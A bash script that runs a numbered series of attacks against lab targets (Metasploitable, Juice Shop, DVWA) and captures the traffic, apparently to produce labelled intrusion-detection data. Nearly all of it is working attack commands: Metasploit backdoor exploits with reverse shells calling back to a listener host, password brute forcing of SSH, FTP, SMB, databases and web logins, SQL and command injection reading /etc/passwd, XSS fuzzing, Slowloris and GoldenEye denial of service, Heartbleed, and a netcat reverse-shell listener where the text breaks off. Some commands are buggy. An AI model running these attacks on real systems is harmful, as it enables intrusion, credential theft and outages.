#!/bin/bash

# Default Variables
LHOST="192.168.70.1"  # Default local host IP
SCAN_DELAY=0.5
INTERFACE="eth0"      # Default network interface
CAPTURE_ENABLED=false
TIMEOUT=600           # Default timeout in seconds
SESSID="sp8qnn41gigkc3o676hus0trt0"  # Default session ID for DVWA tests

# Variables without default values (must be set via command-line)
JUICESHOP_IP=""
METASPLOITABLE_IP=""
DVWA_IP=""
BASE_URL=""

# Create captures directory
mkdir -p captures

# Function to capture traffic
capture_traffic() {
    local name=$1
    shift
    local pcap_file="captures/${name}.pcap"

    echo "Starting capture for $name..."
    sudo tcpdump -i "$INTERFACE" host "$TARGET_IP" -w "$pcap_file" &
    local TCPDUMP_PID=$!

    # Execute the command with input/output redirection
    "$@" </dev/null &>"captures/${name}.log"

    # Wait for a short period to ensure capture is complete
    sleep 2

    # Stop tcpdump
    sudo kill "$TCPDUMP_PID"
    echo "Capture for $name saved to $pcap_file"
}

test1() {
    local name="01_scan_nmap_vuln_Reconnaissance_AT0042"
    echo "Running Test 1: Metasploitable nmap vulnerability scan"
    if [ -z "$METASPLOITABLE_IP" ]; then
        echo "METASPLOITABLE_IP not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" nmap --script vuln "$METASPLOITABLE_IP" -p-
    else
        nmap --script vuln "$METASPLOITABLE_IP" -p-
    fi
}

test2() {
    local name="02_scan_nmap_sCV_Reconnaissance_AT0042"
    echo "Running Test 2: Metasploitable nmap Service and Version Detection"
    if [ -z "$METASPLOITABLE_IP" ]; then
        echo "METASPLOITABLE_IP not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" nmap -sC -sV "$METASPLOITABLE_IP" -p-
    else
        nmap -sC -sV "$METASPLOITABLE_IP" -p-
    fi
}

test3() {
    local name="03_rce_proftpd_Exploits_AT0039"
    echo "Running Test 3: Metasploitable RCE PROFTPD"
    if [ -z "$METASPLOITABLE_IP" ] || [ -z "$LHOST" ]; then
        echo "METASPLOITABLE_IP or LHOST not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout 120 /usr/bin/msfconsole -q -x "use unix/ftp/vsftpd_234_backdoor; set RHOSTS $METASPLOITABLE_IP; run"
    else
        timeout 120 /usr/bin/msfconsole -q -x "use unix/ftp/vsftpd_234_backdoor; set RHOSTS $METASPLOITABLE_IP; run"
    fi
}

test4() {
    local name="04_rce_distccd_Exploits_AT0039"
    echo "Running Test 4: Metasploitable RCE Distccd"
    if [ -z "$METASPLOITABLE_IP" ] || [ -z "$LHOST" ]; then
        echo "METASPLOITABLE_IP or LHOST not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout 120 /usr/bin/msfconsole -q -x "use exploit/unix/misc/distcc_exec; set payload payload/cmd/unix/reverse_perl; set RHOSTS $METASPLOITABLE_IP; set LHOST $LHOST; run"
    else
        timeout 120 /usr/bin/msfconsole -q -x /usr/bin/msfconsole -q -x "use exploit/unix/misc/distcc_exec; set payload payload/cmd/unix/reverse_perl; set RHOSTS $METASPLOITABLE_IP; set LHOST $LHOST; run"
    fi
}

test5() {
    local name="05_rce_ircd_Exploits_AT0039"
    echo "Running Test 5: Metasploitable RCE IRCd"
    if [ -z "$METASPLOITABLE_IP" ] || [ -z "$LHOST" ]; then
        echo "METASPLOITABLE_IP or LHOST not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout 120 /usr/bin/msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set payload payload/cmd/unix/reverse_perl; set RHOSTS $METASPLOITABLE_IP; set LHOST $LHOST; run"
    else
        timeout 120 /usr/bin/msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set payload payload/cmd/unix/reverse_perl; set RHOSTS $METASPLOITABLE_IP; set LHOST $LHOST; run"
    fi
}

test6() {
    local name="06_ssh_bruteforce_SSHBruteforce_AT0019"
    echo "Running Test 6: Metasploitable SSH Bruteforcing"
    if [ -z "$METASPLOITABLE_IP" ]; then
        echo "METASPLOITABLE_IP not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout "$TIMEOUT" hydra -l root -P /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -t 2 ssh://"$METASPLOITABLE_IP"
    else
        timeout "$TIMEOUT" hydra -l root -P /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -t 2 ssh://"$METASPLOITABLE_IP"
    fi
}

test7() {
    local name="07_ftp_bruteforce_FTPBruteForce_AT0018"
    echo "Running Test 7: Metasploitable FTP Bruteforce"
    if [ -z "$METASPLOITABLE_IP" ]; then
        echo "METASPLOITABLE_IP not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout "$TIMEOUT" hydra -l admin -P /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -t 2 ftp://"$METASPLOITABLE_IP"
    else
        timeout "$TIMEOUT" hydra -l admin -P /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -t 2 ftp://"$METASPLOITABLE_IP"
    fi
}

test8() {
    local name="08_smb_bruteforce"
    echo "Running Test 8: Metasploitable SMB Bruteforce"
    if [ -z "$METASPLOITABLE_IP" ]; then
        echo "METASPLOITABLE_IP not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout "$TIMEOUT" hydra -L /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -P /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -t 6 smb://"$METASPLOITABLE_IP"
    else
        timeout "$TIMEOUT" hydra -L /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -P /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -t 6 smb://"$METASPLOITABLE_IP"
    fi
}

test9() {
    local name="09_webapp_bruteforce_WebAttackBruteForce_AT0030"
    echo "Running Test 9: JuiceShop Webapp Bruteforce"
    if [ -z "$JUICESHOP_IP" ]; then
        echo "JUICESHOP_IP not set, skipping test."
        return
    fi
    TARGET_IP="$JUICESHOP_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout $TIMEOUT ffuf -w /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -u "http://$JUICESHOP_IP:3000/rest/user/login" -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"FUZZ" }' -p "$SCAN_DELAY" -fc 401
    else
        timeout $TIMEOUT ffuf -w /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -u "http://$JUICESHOP_IP:3000/rest/user/login" -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"FUZZ" }' -p "$SCAN_DELAY" -fc 401
    fi
}

test10() {
    local name="10_sqli_test_WebAttackSQLInjection_AT0034"
    echo "Running Test 10: Metasploitable SQLi Test"
    if [ -z "$METASPLOITABLE_IP" ]; then
        echo "METASPLOITABLE_IP not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" sqlmap "http://$METASPLOITABLE_IP/?C=test" --level=5 --risk=3 --batch
    else
        sqlmap "http://$METASPLOITABLE_IP/?C=test" --level=5 --risk=3 --batch
    fi
}

test11() {
    local name="11_slowloris_dos_DoS_Slowloris_AT0027"
    echo "Running Test 11: Metasploitable Slowloris DoS"
    if [ -z "$METASPLOITABLE_IP" ]; then
        echo "METASPLOITABLE_IP not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout "$TIMEOUT" python3 /opt/slowloris/slowloris.py "$METASPLOITABLE_IP" -s 500
    else
        timeout "$TIMEOUT" python3 /opt/slowloris/slowloris.py "$METASPLOITABLE_IP" -s 500
    fi
}

test12() {
    local name="12_scan_nmap_vuln_juiceshop_Reconnaissance_AT0042"
    echo "Running Test 12: JuiceShop nmap vulnerability scan"
    if [ -z "$JUICESHOP_IP" ]; then
        echo "JUICESHOP_IP not set, skipping test."
        return
    fi
    TARGET_IP="$JUICESHOP_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" nmap --script vuln "$JUICESHOP_IP" -p 3000
    else
        nmap --script vuln "$JUICESHOP_IP" -p 3000
    fi
}

test13() {
    local name="13_scan_nmap_sCV_juiceshop_Reconnaissance_AT0042"
    echo "Running Test 13: JuiceShop nmap Service and Version Detection"
    if [ -z "$JUICESHOP_IP" ]; then
        echo "JUICESHOP_IP not set, skipping test."
        return
    fi
    TARGET_IP="$JUICESHOP_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" nmap -sC -sV "$JUICESHOP_IP" -p 3000
    else
        nmap -sC -sV "$JUICESHOP_IP" -p 3000
    fi
}

test14() {
    local name="14_nikto_scan_Reconnaissance_AT0042"
    echo "Running Test 14: JuiceShop Nikto Scan"
    if [ -z "$JUICESHOP_IP" ]; then
        echo "JUICESHOP_IP not set, skipping test."
        return
    fi
    TARGET_IP="$JUICESHOP_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout "$TIMEOUT" nikto -h "http://$JUICESHOP_IP:3000" --Pause "$SCAN_DELAY"
    else
        timeout "$TIMEOUT" nikto -h "http://$JUICESHOP_IP:3000" --Pause "$SCAN_DELAY"
    fi
}

test15() {
    local name="15_directory_listing_Reconnaissance_AT0042"
    echo "Running Test 15: JuiceShop Directory Listing"
    if [ -z "$JUICESHOP_IP" ]; then
        echo "JUICESHOP_IP not set, skipping test."
        return
    fi
    TARGET_IP="$JUICESHOP_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout $TIMEOUT ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u "http://$JUICESHOP_IP:3000/FUZZ" -fc 403 -fs 3748 -p "$SCAN_DELAY"
    else
        timeout $TIMEOUT ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u "http://$JUICESHOP_IP:3000/FUZZ" -fc 403 -fs 3748 -p "$SCAN_DELAY"
    fi
}

test16() {
    local name="16_sqli_request_WebAttackSQLInjection_AT0034"
    echo "Running Test 16: JuiceShop SQL Injection via Request File"
    if [ -z "$JUICESHOP_IP" ]; then
        echo "JUICESHOP_IP not set, skipping test."
        return
    fi
    TARGET_IP="$JUICESHOP_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" bash -c "curl https://pastebin.com/raw/1XEC3i74 -o req && sed -i 's/localhost/$JUICESHOP_IP/g' req && sqlmap -r req --level=5 --risk=3 --ignore-code=401"
    else
        bash -c "curl https://pastebin.com/raw/1XEC3i74 -o req && sed -i 's/localhost/$JUICESHOP_IP/g' req && sqlmap -r req --level=5 --risk=3 --ignore-code=401"
    fi
}

test17() {
    local name="17_webapp_bruteforce_login_WebAttackBruteForce_AT0030"
    echo "Running Test 17: Metasploitable Webapp Bruteforce (phpMyAdmin)"
    if [ -z "$METASPLOITABLE_IP" ]; then
        echo "METASPLOITABLE_IP not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" ffuf -w /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -u "http://$METASPLOITABLE_IP/phpMyAdmin/" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "name=admin&pass=FUZZ&form_build_id=form--LT01UegJaKZOA7e84qC5ut41b5KQA-Bz02FqCizyNI&form_id=user_login_block&op=Log+in" -p "$SCAN_DELAY" -fc 401
    else
        ffuf -w /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -u "http://$METASPLOITABLE_IP/phpMyAdmin/" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "name=admin&pass=FUZZ&form_build_id=form--LT01UegJaKZOA7e84qC5ut41b5KQA-Bz02FqCizyNI&form_id=user_login_block&op=Log+in" -p "$SCAN_DELAY" -fc 401
    fi
}

test18() {
    local name="18_nmap_vuln_dvwa_scan_Reconnaissance_AT0042"
    echo "Running Test 18: DVWA nmap vulnerability scan"
    if [ -z "$DVWA_IP" ]; then
        echo "DVWA_IP not set, skipping test."
        return
    fi
    TARGET_IP="$DVWA_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" nmap --script vuln "$DVWA_IP"
    else
        nmap --script vuln "$DVWA_IP"
    fi
}

test19() {
    local name="19_nmap_dvwa_scv_scan_Reconnaissance_AT0042"
    echo "Running Test 19: DVWA nmap Service and Version Detection"
    if [ -z "$DVWA_IP" ]; then
        echo "DVWA_IP not set, skipping test."
        return
    fi
    TARGET_IP="$DVWA_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" nmap -sC -sV "$DVWA_IP"
    else
        nmap -sC -sV "$DVWA_IP"
    fi
}

test20() {
    local name="20_nmap_dvwa_udp_scan_Reconnaissance_AT0042"
    echo "Running Test 20: DVWA nmap UDP scan"
    if [ -z "$DVWA_IP" ]; then
        echo "DVWA_IP not set, skipping test."
        return
    fi
    TARGET_IP="$DVWA_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" nmap -sU -T4 -F "$DVWA_IP"
    else
        nmap -sU -T4 -F "$DVWA_IP"
    fi
}

test21() {
    local name="21_webapp_bruteforce_noisy_WebAttackBruteForce_AT0030"
    echo "Running Test 21: DVWA Webapp Bruteforce (noisy)"
    if [ -z "$DVWA_IP" ] || [ -z "$SESSID" ]; then
        echo "DVWA_IP or SESSID not set, skipping test."
        return
    fi
    TARGET_IP="$DVWA_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" ffuf -w /opt/SecLists/Passwords/xato-net-10-million-passwords-1000000.txt \
            -u "http://$DVWA_IP/DVWA/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login" \
            -H "Cookie: PHPSESSID=$SESSID; security=low" \
            -p "$SCAN_DELAY" -fs 4288
    else
        ffuf -w /opt/SecLists/Passwords/xato-net-10-million-passwords-1000000.txt \
            -u "http://$DVWA_IP/DVWA/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login" \
            -H "Cookie: PHPSESSID=$SESSID; security=low" \
            -p "$SCAN_DELAY" -fs 4288
    fi
}

test22() {
    local name="22_webapp_bruteforce_sneaky_WebAttackBruteForce_AT0030"
    echo "Running Test 22: DVWA Webapp Bruteforce (sneaky)"
    if [ -z "$DVWA_IP" ] || [ -z "$SESSID" ]; then
        echo "DVWA_IP or SESSID not set, skipping test."
        return
    fi
    TARGET_IP="$DVWA_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" ffuf -w /opt/SecLists/Passwords/xato-net-10-million-passwords-100.txt \
            -u "http://$DVWA_IP/DVWA/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login" \
            -H "Cookie: PHPSESSID=$SESSID; security=low" \
            -p "$SCAN_DELAY" -fs 4288
    else
        ffuf -w /opt/SecLists/Passwords/xato-net-10-million-passwords-100.txt \
            -u "http://$DVWA_IP/DVWA/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login" \
            -H "Cookie: PHPSESSID=$SESSID; security=low" \
            -p "$SCAN_DELAY" -fs 4288
    fi
}

test23() {
    local name="23_lfi_scan_Exploits_AT0039"
    echo "Running Test 23: DVWA LFI scan"
    if [ -z "$DVWA_IP" ] || [ -z "$SESSID" ]; then
        echo "DVWA_IP or SESSID not set, skipping test."
        return
    fi
    TARGET_IP="$DVWA_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" ffuf -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \
            -u "http://$DVWA_IP/DVWA/vulnerabilities/fi/?page=FUZZ" \
            -H "Cookie: PHPSESSID=$SESSID; security=low"
    else
        ffuf -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \
            -u "http://$DVWA_IP/DVWA/vulnerabilities/fi/?page=FUZZ" \
            -H "Cookie: PHPSESSID=$SESSID; security=low"
    fi
}

test24() {
    local name="24_sqlmap_test_WebAttackSQLInjection_AT0034"
    echo "Running Test 24: DVWA SQL Injection Test with sqlmap"
    if [ -z "$DVWA_IP" ] || [ -z "$SESSID" ]; then
        echo "DVWA_IP or SESSID not set, skipping test."
        return
    fi
    TARGET_IP="$DVWA_IP"
    rm -rf /root/.local/share/sqlmap/output/
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" sqlmap "http://$DVWA_IP/DVWA/vulnerabilities/sqli/?id=sad&Submit=Submit" \
            --level=5 --risk=3 --batch \
            --cookie "PHPSESSID=$SESSID; security=low"
    else
        sqlmap "http://$DVWA_IP/DVWA/vulnerabilities/sqli/?id=sad&Submit=Submit" \
            --level=5 --risk=3 --batch \
            --cookie "PHPSESSID=$SESSID; security=low"
    fi
}

test25() {
    local name="25_sqli_time_based_manual_WebAttackSQLInjection_AT0034"
    echo "Running Test 25: DVWA SQL Injection Time-Based (manual)"
    if [ -z "$DVWA_IP" ] || [ -z "$SESSID" ]; then
        echo "DVWA_IP or SESSID not set, skipping test."
        return
    fi
    TARGET_IP="$DVWA_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" curl -i -s -k -X 'GET' \
            -b "PHPSESSID=$SESSID; security=low" \
            "http://$DVWA_IP/DVWA/vulnerabilities/sqli_blind/?id=sad'+AND+(SELECT+3116+FROM+(SELECT(SLEEP(5)))crJl)--+tbeJ&Submit=Submit"
    else
        curl -i -s -k -X 'GET' \
            -b "PHPSESSID=$SESSID; security=low" \
            "http://$DVWA_IP/DVWA/vulnerabilities/sqli_blind/?id=sad'+AND+(SELECT+3116+FROM+(SELECT(SLEEP(5)))crJl)--+tbeJ&Submit=Submit"
    fi
}

test26() {
    local name="26_reflected_xss_payloads_XSSBruteForce_AT0032"
    echo "Running Test 26: DVWA Reflected XSS Payloads"
    if [ -z "$DVWA_IP" ] || [ -z "$SESSID" ]; then
        echo "DVWA_IP or SESSID not set, skipping test."
        return
    fi
    TARGET_IP="$DVWA_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" ffuf -w /opt/SecLists/Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt \
            -u "http://$DVWA_IP/DVWA/vulnerabilities/xss_r/?name=FUZZ" \
            -H "Cookie: PHPSESSID=$SESSID; security=low" \
            -p "$SCAN_DELAY"
    else
        ffuf -w /opt/SecLists/Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt \
            -u "http://$DVWA_IP/DVWA/vulnerabilities/xss_r/?name=FUZZ" \
            -H "Cookie: PHPSESSID=$SESSID; security=low" \
            -p "$SCAN_DELAY"
    fi
}

test27() {
    local name="27_stored_xss_XSSBruteForce_AT0032"
    echo "Running Test 27: DVWA Stored XSS"
    if [ -z "$DVWA_IP" ] || [ -z "$SESSID" ]; then
        echo "DVWA_IP or SESSID not set, skipping test."
        return
    fi
    TARGET_IP="$DVWA_IP"

    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" ffuf -w /opt/SecLists/Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt \
            -u "http://$DVWA_IP/DVWA/vulnerabilities/xss_s/" \
            -d "txtName=me&mtxMessage=FUZZ&btnSign=Sign+Guestbook" \
            -H "Cookie: PHPSESSID=$SESSID; security=low" \
            -p "$SCAN_DELAY"
    else
        ffuf -w /opt/SecLists/Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt \
            -u "http://$DVWA_IP/DVWA/vulnerabilities/xss_s/" \
            -d "txtName=me&mtxMessage=FUZZ&btnSign=Sign+Guestbook" \
            -H "Cookie: PHPSESSID=$SESSID; security=low" \
            -p "$SCAN_DELAY"
    fi
}

test28() {
    local name="28_slowloris_dos_dvwa_DoS_Slowloris_AT0027"
    echo "Running Test 28: DVWA Slowloris DoS"
    if [ -z "$DVWA_IP" ]; then
        echo "DVWA_IP not set, skipping test."
        return
    fi
    TARGET_IP="$DVWA_IP"

    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout "$TIMEOUT" python3 /opt/slowloris/slowloris.py "$DVWA_IP" -s 500 -ua
    else
        timeout "$TIMEOUT" python3 /opt/slowloris/slowloris.py "$DVWA_IP" -s 500 -ua
    fi
}

test29() {
    local name="29_nikto_scan_dvwa_Reconnaissance_AT0042"
    echo "Running Test 29: DVWA Nikto Scan"
    if [ -z "$DVWA_IP" ]; then
        echo "DVWA_IP not set, skipping test."
        return
    fi
    TARGET_IP="$DVWA_IP"

    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout "$TIMEOUT" nikto -h "http://$DVWA_IP" --Pause "$SCAN_DELAY"
    else
        timeout "$TIMEOUT" nikto -h "http://$DVWA_IP" --Pause "$SCAN_DELAY"
    fi
}

test30() {
    local name="30_directory_listing_dvwa_Reconnaissance_AT0042"
    echo "Running Test 30: DVWA Directory Listing"
    if [ -z "$DVWA_IP" ]; then
        echo "DVWA_IP not set, skipping test."
        return
    fi
    TARGET_IP="$DVWA_IP"

    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout "$TIMEOUT" ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt \
            -u "http://$DVWA_IP/DVWA/FUZZ" -fc 403 \
            -p "$SCAN_DELAY"
    else
        timeout "$TIMEOUT" ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt \
            -u "http://$DVWA_IP/DVWA/FUZZ" -fc 403 \
            -p "$SCAN_DELAY"
    fi
}

test31() {
    local name="31_command_injection_Exploits_AT0039"
    echo "Running Test 31: DVWA Command Injection"
    if [ -z "$DVWA_IP" ] || [ -z "$SESSID" ]; then
        echo "DVWA_IP or SESSID not set, skipping test."
        return
    fi
    TARGET_IP="$DVWA_IP"

    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" curl -i -s -k -X 'POST' \
            -b "PHPSESSID=$SESSID; security=low" \
            --data-binary 'ip=%3B+cat+%2Fetc%2Fpasswd&Submit=Submit' \
            "http://$DVWA_IP/DVWA/vulnerabilities/exec/" | grep -A30 '<pre>'
    else
        curl -i -s -k -X 'POST' \
            -b "PHPSESSID=$SESSID; security=low" \
            --data-binary 'ip=%3B+cat+%2Fetc%2Fpasswd&Submit=Submit' \
            "http://$DVWA_IP/DVWA/vulnerabilities/exec/" | grep -A30 '<pre>'
    fi
}

test32() {
    local name="32_patator_ftp_login_FTPBruteForce_AT0018"
    echo "Running Test 32: Patator FTP Login Brute Force"
    if [ -z "$METASPLOITABLE_IP" ]; then
        echo "METASPLOITABLE_IP not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout "$TIMEOUT" docker run -it --rm -v /opt/SecLists:/mnt lanjelot/patator ftp_login user=FILE0 password=FILE1 0=/mnt/Usernames/top-usernames-shortlist.txt 1=/mnt/Passwords/xato-net-10-million-passwords-1000000.txt host="$PATATOR_TARGET_IP" port=2121
    else
        timeout "$TIMEOUT" docker run -it --rm -v /opt/SecLists:/mnt lanjelot/patator ftp_login user=FILE0 password=FILE1 0=/mnt/Usernames/top-usernames-shortlist.txt 1=/mnt/Passwords/xato-net-10-million-passwords-1000000.txt host="$PATATOR_TARGET_IP" port=2121
    fi
}

test33() {
    local name="33_patator_ssh_login_SSHBruteforce_AT0019"
    echo "Running Test 33: Patator SSH Login Brute Force"
    if [ -z "$METASPLOITABLE_IP" ]; then
        echo "METASPLOITABLE_IP not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout "$TIMEOUT" docker run -it --rm -v /opt/SecLists:/mnt lanjelot/patator ssh_login user=FILE0 password=FILE1 0=/mnt/Usernames/top-usernames-shortlist.txt 1=/mnt/Passwords/xato-net-10-million-passwords-1000000.txt host="$PATATOR_TARGET_IP"
    else
        timeout "$TIMEOUT" docker run -it --rm -v /opt/SecLists:/mnt lanjelot/patator ssh_login user=FILE0 password=FILE1 0=/mnt/Usernames/top-usernames-shortlist.txt 1=/mnt/Passwords/xato-net-10-million-passwords-1000000.txt host="$PATATOR_TARGET_IP"
    fi
}

test34() {
    local name="34_patator_mysql_login_Infilteration_AT0021"
    echo "Running Test 34: Patator MySQL Login Brute Force"
    if [ -z "$METASPLOITABLE_IP" ]; then
        echo "PATATOR_TARGET_IP not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout "$TIMEOUT" docker run -it --rm -v /opt/SecLists:/mnt lanjelot/patator mysql_login user=FILE0 password=FILE1 0=/mnt/Usernames/top-usernames-shortlist.txt 1=/mnt/Passwords/xato-net-10-million-passwords-1000000.txt host="$PATATOR_TARGET_IP"
    else
        timeout "$TIMEOUT" docker run -it --rm -v /opt/SecLists:/mnt lanjelot/patator mysql_login user=FILE0 password=FILE1 0=/mnt/Usernames/top-usernames-shortlist.txt 1=/mnt/Passwords/xato-net-10-million-passwords-1000000.txt host="$PATATOR_TARGET_IP"
    fi
}

test35() {
    local name="35_patator_pgsql_login_Infilteration_AT0021"
    echo "Running Test 35: Patator PostgreSQL Login Brute Force"
    if [ -z "$METASPLOITABLE_IP" ]; then
        echo "PATATOR_TARGET_IP not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout "$TIMEOUT" docker run -it --rm -v /opt/SecLists:/mnt lanjelot/patator pgsql_login user=FILE0 password=FILE1 0=/mnt/Usernames/top-usernames-shortlist.txt 1=/mnt/Passwords/xato-net-10-million-passwords-1000000.txt host="$PATATOR_TARGET_IP"
    else
        timeout "$TIMEOUT" docker run -it --rm -v /opt/SecLists:/mnt lanjelot/patator pgsql_login user=FILE0 password=FILE1 0=/mnt/Usernames/top-usernames-shortlist.txt 1=/mnt/Passwords/xato-net-10-million-passwords-1000000.txt host="$PATATOR_TARGET_IP"
    fi
}

test36() {
    local name="36_patator_vnc_login_Infilteration_AT0021"
    echo "Running Test 36: Patator VNC Login Brute Force"
    if [ -z "$METASPLOITABLE_IP" ]; then
        echo "PATATOR_TARGET_IP not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout "$TIMEOUT" docker run -it --rm -v /opt/SecLists:/mnt lanjelot/patator vnc_login user=FILE0 password=FILE1 0=/mnt/Usernames/top-usernames-shortlist.txt 1=/mnt/Passwords/xato-net-10-million-passwords-1000000.txt host="$PATATOR_TARGET_IP"
    else
        timeout "$TIMEOUT" docker run -it --rm -v /opt/SecLists:/mnt lanjelot/patator vnc_login user=FILE0 password=FILE1 0=/mnt/Usernames/top-usernames-shortlist.txt 1=/mnt/Passwords/xato-net-10-million-passwords-1000000.txt host="$PATATOR_TARGET_IP"
    fi
}

test37() {
    local name="37_goldeneye_dos_DoSHulk_AT0017"
    echo "Running Test 37: GoldenEye DoS Attack"
    if [ -z "$METASPLOITABLE_IP" ]; then
        echo "GOLDENEYE_TARGET_IP not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout "$TIMEOUT" /usr/bin/python /opt/GoldenEye/goldeneye.py "http://$GOLDENEYE_TARGET_IP" -d -n -m 'random'
    else
       timeout "$TIMEOUT"  /usr/bin/python /opt/GoldenEye/goldeneye.py "http://$GOLDENEYE_TARGET_IP" -d -n -m 'random'
    fi
}

test38() {
    local name="38_heartbleed_attack_Heartbleed_AT0035"
    echo "Running Test 38: Heartbleed Exploit Test"
    if [ -z "$METASPLOITABLE_IP" ]; then
        echo "HEARTBLEED_TARGET_IP not set, skipping test."
        return
    fi
    TARGET_IP="$METASPLOITABLE_IP"
    if [ "$CAPTURE_ENABLED" = true ]; then
        capture_traffic "$name" timeout "$TIMEOUT" /opt/HeartBleed/heartbleed-exploit.py "$TARGET_IP" --port 8443
    else
        timeout "$TIMEOUT" /opt/HeartBleed/heartbleed-exploit.py "$TARGET_IP" -port 8443
    fi
}


test39() {
    local name="39_netcat_reverse_shell_Backdoor_AT0037"
    echo "Running Test 39: DVWA Netcat Reverse Shell Attempt"
    if [ -z "$DVWA_IP" ] || [ -z "$SESSID" ] || [ -z "$LHOST" ]; then
        echo "DVWA_IP, SESSID, or LHOST not set, skipping test."
        return
    fi
    TARGET_IP="$DVWA_IP"

    if [ "$CAPTURE_ENABLED" = true ]; then
        echo "Capture not supported for this test due to interactive nature."
        nc -lvp 4444 &
        sleep 1
